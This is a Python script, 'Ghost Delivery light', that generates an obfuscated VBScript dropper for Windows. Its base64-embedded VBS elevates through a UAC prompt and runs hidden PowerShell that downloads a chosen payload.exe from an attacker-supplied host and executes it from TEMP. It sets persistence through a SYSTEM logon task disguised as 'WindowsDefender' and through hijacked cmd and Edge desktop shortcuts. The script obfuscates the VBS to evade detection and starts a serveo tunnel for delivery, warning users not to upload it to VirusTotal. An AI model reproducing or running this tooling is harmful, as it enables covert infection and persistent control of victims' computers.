import random, sys, string, os, time, base64
#Coded by s1ege
#light version: less noise same persistence..
#Greetz to all GSH members..
#Use for educational purposes, blah blah
def prnt():
	print("""
				~Ghost Delivery light~
		This tool is designed create a .vbs script that:

		*Downloads payload to TEMP directory and executes payload
		to bypass windows smart screen
		
		*Injects/creates Command Prompt and Microsoft Edge
		shortcuts with payload path

		*Adds scheduled task for payload to be run at login

		*Obfuscates the vbs script

		*Has serveo option to deliver obfuscated vbs script
	""")
def clear():
    if os.name == "nt": os.system('cls')
    else: os.system('clear')

def obfs():
    splitter = str(chr(42))

    def randCapitalization(characters):
        capicharacter = ""
        for character in characters:
            lowup = random.randrange(0,2)
            if lowup == 0:
                capicharacter += character.upper()
            if lowup == 1:
                capicharacter +=  character.lower()
        return capicharacter

    NUM_OF_CHARS = random.randrange(5, 60)
    pld = ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase) for _ in range(NUM_OF_CHARS))
    array = ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase) for _ in range(NUM_OF_CHARS))
    temp = ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase) for _ in range(NUM_OF_CHARS))
    x = ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase) for _ in range(NUM_OF_CHARS))

    subOne = ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase) for _ in range(NUM_OF_CHARS))
    subTwo = ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase) for _ in range(NUM_OF_CHARS))

    def obfu(body):
        encBody = ""
        for i in range(0, len(body)):
            if encBody == "":
                encBody += expr(ord(body[i]))
            else:
                encBody += "*" + expr(ord(body[i]))
        return encBody

    def expr(char):
        range = random.randrange(100, 10001)
        exp = random.randrange(0, 3)

        if exp == 0:
            print "Char " + str(char) + " -> " + str((range+char)) + "-" + str(range)
            return str((range+char)) + "-" + str(range)
        if exp == 1:
            print "Char " + str(char) + " -> " + str((char-range)) + "+" + str(range)
            return str((char-range)) + "+" + str(range)
        if exp == 2:
            print "Char " + str(char) + " -> " + str((char*range)) + "/" + str(range)
            return str((char*range)) + "/" + str(range)

    clear_text_file = open("t", "r")
    obfuscated_file = open("obfs.vbs", "w")

    obfuscated_file.write(randCapitalization("Dim " + pld + ", " + array + ", " + temp) + "\n")
    obfuscated_file.write(randCapitalization("Sub " + subOne) + "\n")
    obfuscated_file.write(randCapitalization(pld + " = ") + chr(34) + obfu(clear_text_file.read()) + chr(34) + "\n")
    obfuscated_file.write(randCapitalization(array + " = Split(" + pld + ", chr(eval(") + obfu(splitter) + ")))\n")
    obfuscated_file.write(randCapitalization("for each " + x + " in " + array) + "\n")
    obfuscated_file.write(randCapitalization(temp + " = " + temp + " & chr(eval(" + x) + "))\n")
    obfuscated_file.write(randCapitalization("next") + "\n")
    obfuscated_file.write(randCapitalization(subTwo) + "\n")
    obfuscated_file.write(randCapitalization("End Sub") + "\n")
    obfuscated_file.write(randCapitalization("Sub " + subTwo) + "\n")
    obfuscated_file.write(randCapitalization("eval(execute(" + temp) + "))\n")
    obfuscated_file.write(randCapitalization("End Sub") + "\n")
    obfuscated_file.write(randCapitalization(subOne) + "\n")
    clear_text_file.close()
    obfuscated_file.close()


def serveo():
    input = raw_input('\n\n\tDelivery script obfuscated and saved as "obfs.vbs"\n\n Would you like to start a serveo server to forward port 80 for payload delivery? yes/no: ')
    if input == "yes":
        domain = raw_input('enter subdomain name for serveo server: ')
        print("\n\nDon't upload to virus total!!!"* 15)
        time.sleep(2)
        os.system('ssh -o ServerAliveInterval=60 -R'+domain+'.serveo.net:80:localhost:80 serveo.net')
    elif input == "no":
        print("\n\nDon't upload to virus total!!!"* 15)
        time.sleep(2)
        sys.exit()

def main():
	clear()
	prnt()
	script = "J0lmIFdTY3JpcHQuQXJndW1lbnRzLmxlbmd0aCA9IDAgVGhlbicsICcgICBTZXQgb2JqU2hlbGwgPSBDcmVhdGVPYmplY3QoIlNoZWxsLkFwcGxpY2F0aW9uIiknLCAnICAgIG9ialNoZWxsLlNoZWxsRXhlY3V0ZSAid3NjcmlwdC5leGUiLCBDaHIoMzQpICYgXycsICcgICAgICBXU2NyaXB0LlNjcmlwdEZ1bGxOYW1lICYgQ2hyKDM0KSAmICIgdWFjIiwgIiIsICJydW5hcyIsIDEnLCAnRWxzZScsICdTZXQgd3NjID0gQ3JlYXRlT2JqZWN0KCJXc2NyaXB0LnNoZWxsIiknLCAnd3NjLmV4ZWMoInBvd2Vyc2hlbGwgLXdpbmRvd3N0eWxlIGhpZGRlbiAtY29tbWFuZCAmIHsgaXdyIGh0dHA6Ly9hZGRyZXNzL3BheWxvYWQuZXhlIC1PdXRGaWxlICVURU1QJS9wYXlsb2FkLmV4ZSB9OyAlVEVNUCUvLi9wYXlsb2FkLmV4ZTsgU2NodGFza3MgL0NyZWF0ZSAvdG4gV2luZG93c0RlZmVuZGVyIC9zYyBPTkxPR09OIC9ybCBoaWdoZXN0IC9ydSBzeXN0ZW0gL0YgL3RyICIiJVRFTVAlL3BheWxvYWQuZXhlIiIiKScsICdTZXQgbG5rID0gd3NjLkNyZWF0ZVNob3J0Y3V0KHdzYy5TcGVjaWFsRm9sZGVycygiZGVza3RvcCIpICYgIlxjbWQuTE5LIiknLCAnbG5rLnRhcmdldHBhdGggPSAiQzpcV2luZG93c1xTeXN0ZW0zMlxjbWQuZXhlIicsICdsbmsuQXJndW1lbnRzID0gIi9jIFNUQVJUIC9NSU4gcG93ZXJzaGVsbCAtd2luZG93c3R5bGUgaGlkZGVuIC1Db21tYW5kIFN0YXJ0LVByb2Nlc3MgY21kOyAlVEVNUCUvLi9wYXlsb2FkLmV4ZSInLCAnbG5rLnNhdmUnLCAnU2V0IGxuayA9IHdzYy5DcmVhdGVTaG9ydGN1dCh3c2MuU3BlY2lhbEZvbGRlcnMoImRlc2t0b3AiKSAmICJcTWljcm9zb2Z0IEVkZ2UuTE5LIiknLCAnbG5rLnRhcmdldHBhdGggPSAiQzpcV2luZG93c1xTeXN0ZW0zMlxjbWQuZXhlIicsICdsbmsuQXJndW1lbnRzID0gIi9jIFNUQVJUIC9NSU4gcG93ZXJzaGVsbC5leGUgLXdpbmRvd3N0eWxlIGhpZGRlbiAtY29tbWFuZCBzdGFydCBtaWNyb3NvZnQtZWRnZTo7ICVURU1QJS8uL3BheWxvYWQuZXhlOyInLCAnbG5rLnNhdmUnLCAnRW5kIGlmJw=="
	lstring = base64.b64decode(script)
	lines = lstring[1:-1].split("', '")

	ip = raw_input("Enter server IP address hosting your payload (example: facebook.serveo.net): ")
	lines = [content.replace('address', ip) for content in lines]

	payload = raw_input("\nEnter name of payload to be delivered (Example: payload.exe): ")
	lines = [content.replace('payload.exe', payload) for content in lines]

	outfile = open("t", "w")
	with open("t", "w") as file:
		for line in lines:
			file.write(line + "\n")
		file.close()
	obfs()
	os.remove('t')
	time.sleep(1)
	clear()
	serveo()
if __name__== "__main__":
  main()
